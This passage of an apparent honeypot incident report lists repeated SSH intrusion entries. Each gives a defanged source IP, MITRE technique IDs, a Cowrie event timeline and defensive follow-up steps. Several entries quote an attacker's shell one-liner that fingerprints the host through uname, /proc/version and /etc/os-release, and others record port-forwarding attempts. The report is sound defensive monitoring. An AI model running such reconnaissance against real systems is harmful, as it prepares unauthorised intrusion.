| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 05:05 |
| **Last Seen** | 2026-07-15 05:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:05:37` | `cowrie.session.connect` |
| `2026-07-15 05:05:37` | `cowrie.client.version` |
| `2026-07-15 05:05:37` | `cowrie.client.kex` |
| `2026-07-15 05:05:37` | `cowrie.login.success` |
| `2026-07-15 05:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df71e8e002d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 05:05 |
| **Last Seen** | 2026-07-15 05:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:05:37` | `cowrie.session.connect` |
| `2026-07-15 05:05:37` | `cowrie.client.version` |
| `2026-07-15 05:05:37` | `cowrie.client.kex` |
| `2026-07-15 05:05:37` | `cowrie.login.success` |
| `2026-07-15 05:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8284fc96af0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:05 |
| **Last Seen** | 2026-07-15 05:06 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:05:52` | `cowrie.session.connect` |
| `2026-07-15 05:05:53` | `cowrie.client.version` |
| `2026-07-15 05:05:53` | `cowrie.client.kex` |
| `2026-07-15 05:05:58` | `cowrie.login.success` |
| `2026-07-15 05:06:01` | `cowrie.session.params` |
| `2026-07-15 05:06:01` | `cowrie.command.input` |
| `2026-07-15 05:06:01` | `cowrie.command.input` |
| `2026-07-15 05:06:01` | `cowrie.command.input` |
| `2026-07-15 05:06:01` | `cowrie.command.input` |
| `2026-07-15 05:06:01` | `cowrie.command.input` |
| `2026-07-15 05:06:01` | `cowrie.command.success` |
| `2026-07-15 05:06:01` | `cowrie.command.input` |
| `2026-07-15 05:06:01` | `cowrie.command.input` |
| `2026-07-15 05:06:01` | `cowrie.command.input` |
| `2026-07-15 05:06:01` | `cowrie.command.input` |
| `2026-07-15 05:06:02` | `cowrie.log.closed` |
| `2026-07-15 05:06:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ce754310c78

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:08 |
| **Last Seen** | 2026-07-15 05:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:08:47` | `cowrie.session.connect` |
| `2026-07-15 05:08:48` | `cowrie.client.version` |
| `2026-07-15 05:08:48` | `cowrie.client.kex` |
| `2026-07-15 05:08:51` | `cowrie.login.success` |
| `2026-07-15 05:08:53` | `cowrie.session.params` |
| `2026-07-15 05:08:53` | `cowrie.command.input` |
| `2026-07-15 05:08:53` | `cowrie.command.input` |
| `2026-07-15 05:08:53` | `cowrie.command.input` |
| `2026-07-15 05:08:53` | `cowrie.command.input` |
| `2026-07-15 05:08:53` | `cowrie.command.input` |
| `2026-07-15 05:08:53` | `cowrie.command.success` |
| `2026-07-15 05:08:53` | `cowrie.command.input` |
| `2026-07-15 05:08:53` | `cowrie.command.input` |
| `2026-07-15 05:08:53` | `cowrie.command.input` |
| `2026-07-15 05:08:54` | `cowrie.command.input` |
| `2026-07-15 05:08:55` | `cowrie.log.closed` |
| `2026-07-15 05:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca51b8fceb14

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:11 |
| **Last Seen** | 2026-07-15 05:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:11:43` | `cowrie.session.connect` |
| `2026-07-15 05:11:43` | `cowrie.client.version` |
| `2026-07-15 05:11:43` | `cowrie.client.kex` |
| `2026-07-15 05:11:46` | `cowrie.login.success` |
| `2026-07-15 05:11:48` | `cowrie.session.params` |
| `2026-07-15 05:11:48` | `cowrie.command.input` |
| `2026-07-15 05:11:48` | `cowrie.command.input` |
| `2026-07-15 05:11:48` | `cowrie.command.input` |
| `2026-07-15 05:11:48` | `cowrie.command.input` |
| `2026-07-15 05:11:48` | `cowrie.command.input` |
| `2026-07-15 05:11:48` | `cowrie.command.success` |
| `2026-07-15 05:11:48` | `cowrie.command.input` |
| `2026-07-15 05:11:48` | `cowrie.command.input` |
| `2026-07-15 05:11:48` | `cowrie.command.input` |
| `2026-07-15 05:11:48` | `cowrie.command.input` |
| `2026-07-15 05:11:49` | `cowrie.log.closed` |
| `2026-07-15 05:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b68121ef535f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 05:13 |
| **Last Seen** | 2026-07-15 05:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:13:12` | `cowrie.session.connect` |
| `2026-07-15 05:13:12` | `cowrie.client.version` |
| `2026-07-15 05:13:12` | `cowrie.client.kex` |
| `2026-07-15 05:13:12` | `cowrie.login.success` |
| `2026-07-15 05:13:12` | `cowrie.direct-tcpip.request` |
| `2026-07-15 05:13:13` | `cowrie.direct-tcpip.data` |
| `2026-07-15 05:13:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-725260ffbc9e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:14 |
| **Last Seen** | 2026-07-15 05:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:14:40` | `cowrie.session.connect` |
| `2026-07-15 05:14:40` | `cowrie.client.version` |
| `2026-07-15 05:14:40` | `cowrie.client.kex` |
| `2026-07-15 05:14:44` | `cowrie.login.success` |
| `2026-07-15 05:14:46` | `cowrie.session.params` |
| `2026-07-15 05:14:46` | `cowrie.command.input` |
| `2026-07-15 05:14:46` | `cowrie.command.input` |
| `2026-07-15 05:14:46` | `cowrie.command.input` |
| `2026-07-15 05:14:46` | `cowrie.command.input` |
| `2026-07-15 05:14:46` | `cowrie.command.input` |
| `2026-07-15 05:14:46` | `cowrie.command.success` |
| `2026-07-15 05:14:46` | `cowrie.command.input` |
| `2026-07-15 05:14:46` | `cowrie.command.input` |
| `2026-07-15 05:14:46` | `cowrie.command.input` |
| `2026-07-15 05:14:46` | `cowrie.command.input` |
| `2026-07-15 05:14:47` | `cowrie.log.closed` |
| `2026-07-15 05:14:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db5a2a620cf6

| Field | Detail |
|---|---|
| **Source IP** | `124.167.20[.]113` |
| **First Seen** | 2026-07-15 05:15 |
| **Last Seen** | 2026-07-15 05:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:15:20` | `cowrie.session.connect` |
| `2026-07-15 05:15:21` | `cowrie.client.version` |
| `2026-07-15 05:15:21` | `cowrie.client.kex` |
| `2026-07-15 05:15:23` | `cowrie.login.success` |
| `2026-07-15 05:15:24` | `cowrie.direct-tcpip.request` |
| `2026-07-15 05:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.167.20[.]113` to AbuseIPDB if not already reported
- [ ] Block `124.167.20[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1139cb19e6e6

| Field | Detail |
|---|---|
| **Source IP** | `34.52.206[.]162` |
| **First Seen** | 2026-07-15 05:15 |
| **Last Seen** | 2026-07-15 05:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:15:24` | `cowrie.session.connect` |
| `2026-07-15 05:15:24` | `cowrie.login.success` |
| `2026-07-15 05:15:24` | `cowrie.session.params` |
| `2026-07-15 05:15:24` | `cowrie.command.input` |
| `2026-07-15 05:15:24` | `cowrie.command.input` |
| `2026-07-15 05:15:24` | `cowrie.command.failed` |
| `2026-07-15 05:15:24` | `cowrie.command.input` |
| `2026-07-15 05:15:24` | `cowrie.log.closed` |
| `2026-07-15 05:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.52.206[.]162` to AbuseIPDB if not already reported
- [ ] Block `34.52.206[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c5472271ac4

| Field | Detail |
|---|---|
| **Source IP** | `116.228.195[.]251` |
| **First Seen** | 2026-07-15 05:15 |
| **Last Seen** | 2026-07-15 05:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:15:34` | `cowrie.session.connect` |
| `2026-07-15 05:15:35` | `cowrie.client.version` |
| `2026-07-15 05:15:35` | `cowrie.client.kex` |
| `2026-07-15 05:15:37` | `cowrie.login.success` |
| `2026-07-15 05:15:38` | `cowrie.direct-tcpip.request` |
| `2026-07-15 05:15:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.228.195[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.228.195[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36842342c095

| Field | Detail |
|---|---|
| **Source IP** | `34.52.206[.]162` |
| **First Seen** | 2026-07-15 05:15 |
| **Last Seen** | 2026-07-15 05:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:15:37` | `cowrie.session.connect` |
| `2026-07-15 05:15:37` | `cowrie.login.success` |
| `2026-07-15 05:15:38` | `cowrie.session.params` |
| `2026-07-15 05:15:38` | `cowrie.command.input` |
| `2026-07-15 05:15:38` | `cowrie.command.failed` |
| `2026-07-15 05:15:44` | `cowrie.log.closed` |
| `2026-07-15 05:15:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.52.206[.]162` to AbuseIPDB if not already reported
- [ ] Block `34.52.206[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e07fe8b2128

| Field | Detail |
|---|---|
| **Source IP** | `34.52.206[.]162` |
| **First Seen** | 2026-07-15 05:15 |
| **Last Seen** | 2026-07-15 05:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:15:39` | `cowrie.session.connect` |
| `2026-07-15 05:15:39` | `cowrie.login.success` |
| `2026-07-15 05:15:40` | `cowrie.session.params` |
| `2026-07-15 05:15:40` | `cowrie.command.input` |
| `2026-07-15 05:15:44` | `cowrie.log.closed` |
| `2026-07-15 05:15:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.52.206[.]162` to AbuseIPDB if not already reported
- [ ] Block `34.52.206[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1a230bbef1c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 05:16 |
| **Last Seen** | 2026-07-15 05:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:16:40` | `cowrie.session.connect` |
| `2026-07-15 05:16:40` | `cowrie.client.version` |
| `2026-07-15 05:16:40` | `cowrie.client.kex` |
| `2026-07-15 05:16:41` | `cowrie.login.success` |
| `2026-07-15 05:16:41` | `cowrie.session.params` |
| `2026-07-15 05:16:41` | `cowrie.command.input` |
| `2026-07-15 05:16:41` | `cowrie.log.closed` |
| `2026-07-15 05:16:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fac5a23dd0bf

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:17 |
| **Last Seen** | 2026-07-15 05:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:17:40` | `cowrie.session.connect` |
| `2026-07-15 05:17:41` | `cowrie.client.version` |
| `2026-07-15 05:17:41` | `cowrie.client.kex` |
| `2026-07-15 05:17:43` | `cowrie.login.success` |
| `2026-07-15 05:17:45` | `cowrie.session.params` |
| `2026-07-15 05:17:45` | `cowrie.command.input` |
| `2026-07-15 05:17:45` | `cowrie.command.input` |
| `2026-07-15 05:17:45` | `cowrie.command.input` |
| `2026-07-15 05:17:45` | `cowrie.command.input` |
| `2026-07-15 05:17:45` | `cowrie.command.input` |
| `2026-07-15 05:17:45` | `cowrie.command.success` |
| `2026-07-15 05:17:45` | `cowrie.command.input` |
| `2026-07-15 05:17:45` | `cowrie.command.input` |
| `2026-07-15 05:17:45` | `cowrie.command.input` |
| `2026-07-15 05:17:45` | `cowrie.command.input` |
| `2026-07-15 05:17:46` | `cowrie.log.closed` |
| `2026-07-15 05:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-054a64c74c57

| Field | Detail |
|---|---|
| **Source IP** | `112.120.115[.]152` |
| **First Seen** | 2026-07-15 05:18 |
| **Last Seen** | 2026-07-15 05:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:18:23` | `cowrie.session.connect` |
| `2026-07-15 05:18:24` | `cowrie.client.version` |
| `2026-07-15 05:18:24` | `cowrie.client.kex` |
| `2026-07-15 05:18:27` | `cowrie.login.success` |
| `2026-07-15 05:18:28` | `cowrie.direct-tcpip.request` |
| `2026-07-15 05:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.115[.]152` to AbuseIPDB if not already reported
- [ ] Block `112.120.115[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be9073769e1d

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]47` |
| **First Seen** | 2026-07-15 05:18 |
| **Last Seen** | 2026-07-15 05:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:18:39` | `cowrie.session.connect` |
| `2026-07-15 05:18:40` | `cowrie.client.version` |
| `2026-07-15 05:18:40` | `cowrie.client.kex` |
| `2026-07-15 05:18:43` | `cowrie.login.success` |
| `2026-07-15 05:18:44` | `cowrie.direct-tcpip.request` |
| `2026-07-15 05:18:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]47` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2b581c60579

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:20 |
| **Last Seen** | 2026-07-15 05:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:20:27` | `cowrie.session.connect` |
| `2026-07-15 05:20:27` | `cowrie.client.version` |
| `2026-07-15 05:20:27` | `cowrie.client.kex` |
| `2026-07-15 05:20:30` | `cowrie.login.success` |
| `2026-07-15 05:20:32` | `cowrie.session.params` |
| `2026-07-15 05:20:32` | `cowrie.command.input` |
| `2026-07-15 05:20:32` | `cowrie.command.input` |
| `2026-07-15 05:20:32` | `cowrie.command.input` |
| `2026-07-15 05:20:32` | `cowrie.command.input` |
| `2026-07-15 05:20:32` | `cowrie.command.input` |
| `2026-07-15 05:20:32` | `cowrie.command.success` |
| `2026-07-15 05:20:32` | `cowrie.command.input` |
| `2026-07-15 05:20:32` | `cowrie.command.input` |
| `2026-07-15 05:20:32` | `cowrie.command.input` |
| `2026-07-15 05:20:32` | `cowrie.command.input` |
| `2026-07-15 05:20:32` | `cowrie.log.closed` |
| `2026-07-15 05:20:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8babc2e742b9

| Field | Detail |
|---|---|
| **Source IP** | `218.21.246[.]238` |
| **First Seen** | 2026-07-15 05:22 |
| **Last Seen** | 2026-07-15 05:22 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:22:26` | `cowrie.session.connect` |
| `2026-07-15 05:22:28` | `cowrie.client.version` |
| `2026-07-15 05:22:28` | `cowrie.client.kex` |
| `2026-07-15 05:22:30` | `cowrie.login.success` |
| `2026-07-15 05:22:31` | `cowrie.direct-tcpip.request` |
| `2026-07-15 05:22:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.246[.]238` to AbuseIPDB if not already reported
- [ ] Block `218.21.246[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1b57852d5c8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:23 |
| **Last Seen** | 2026-07-15 05:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:23:05` | `cowrie.session.connect` |
| `2026-07-15 05:23:06` | `cowrie.client.version` |
| `2026-07-15 05:23:06` | `cowrie.client.kex` |
| `2026-07-15 05:23:08` | `cowrie.login.success` |
| `2026-07-15 05:23:09` | `cowrie.session.params` |
| `2026-07-15 05:23:09` | `cowrie.command.input` |
| `2026-07-15 05:23:10` | `cowrie.command.input` |
